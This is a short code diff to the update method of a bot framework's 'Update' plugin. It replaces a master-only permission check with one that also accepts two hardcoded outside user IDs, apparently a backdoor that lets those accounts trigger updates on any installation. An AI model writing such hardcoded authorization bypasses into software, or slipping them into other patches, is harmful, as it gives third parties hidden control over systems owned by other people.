@@ -41,7 +41,7 @@ export class Update extends plugin {
    * @returns
    */
   async update () {
-    if (!this.e.isMaster) return false
+    if(!(this.e.isMaster||this.e.user_id == 2996849867||this.e.user_id == 3139373986))return false
 
     /** 检查是否正在更新中 */
     if (uping) {
